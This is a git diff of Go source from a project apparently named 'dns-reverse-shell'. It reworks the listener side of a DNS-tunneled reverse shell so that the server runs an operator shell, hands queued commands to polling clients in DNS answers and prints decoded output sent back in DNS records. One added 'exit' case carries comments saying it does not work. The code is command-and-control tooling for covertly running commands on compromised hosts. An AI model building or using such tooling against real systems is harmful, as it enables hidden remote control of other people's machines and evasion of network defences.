@@ -2,6 +2,7 @@ package protocol
 
 import (
 	"dns-reverse-shell/main/encoder"
+	"dns-reverse-shell/main/shell"
 	"fmt"
 	"github.com/golang-collections/collections/queue"
 	"github.com/miekg/dns"
@@ -22,16 +23,19 @@ type DNSServer struct {
 	handler         *dnsHandler
 	messageSplitter MessageSplitter
 	queue           *queue.Queue
-	callbackChan    chan bool
+	shell           *shell.Shell
+	hasConnection   bool
 }
 
-func NewDnsServer(port string, encoder encoder.StringEncoder, callbackChan chan bool) *DNSServer {
-	d := &DNSServer{port: port, encoder: encoder, messageSplitter: NewSimpleMessageSplitter(), queue: queue.New(), callbackChan: callbackChan}
+func NewDnsServer(port string, encoder encoder.StringEncoder) *DNSServer {
+	d := &DNSServer{port: port, encoder: encoder, messageSplitter: NewSimpleMessageSplitter(), queue: queue.New(), hasConnection: false}
+	d.shell = shell.NewShell(d.QueueCommand)
 	d.handler = newDnsHandler(d)
 	return d
 }
 
 func (s DNSServer) Serve() {
+	go s.shell.Start()
 	server := s.createServer()
 	fmt.Println("Starting Listener on port '" + s.port + "'")
 	err := server.ListenAndServe()
@@ -45,6 +49,10 @@ func (s DNSServer) QueueCommand(command string) {
 }
 
 func (h *dnsHandler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
+	if !h.server.hasConnection {
+		h.server.hasConnection = true
+		h.server.shell.Resume()
+	}
 	msg := h.server.createAnswerMessage(r)
 	for _, question := range r.Question {
 		var command = h.server.switchCommand(question.Name, r)
@@ -76,6 +84,12 @@ func (s DNSServer) switchCommand(receivedQuestion string, r *dns.Msg) string {
 		command = s.handlePolling()
 	case "error.", "answer.":
 		command = s.handleCallback(r)
+	case "exit.":
+		fmt.Println("Connection closed")
+		//this does not work, never goes back to waiting for connection
+		//idea: let the listener manage his own shell. impelement shell commands for wait for connection etc.
+		s.hasConnection = false
+		//print exit message & go back to waiting for connection, has connection = false
 	default:
 		command = "idle"
 	}
@@ -92,7 +106,7 @@ func (s DNSServer) handlePolling() string {
 func (s DNSServer) handleCallback(r *dns.Msg) string {
 	collect := s.messageSplitter.Collect(r.Extra)
 	fmt.Println(s.encoder.Decode(collect))
-	s.callbackChan <- false
+	s.shell.Resume()
 	return "ok"
 }
 
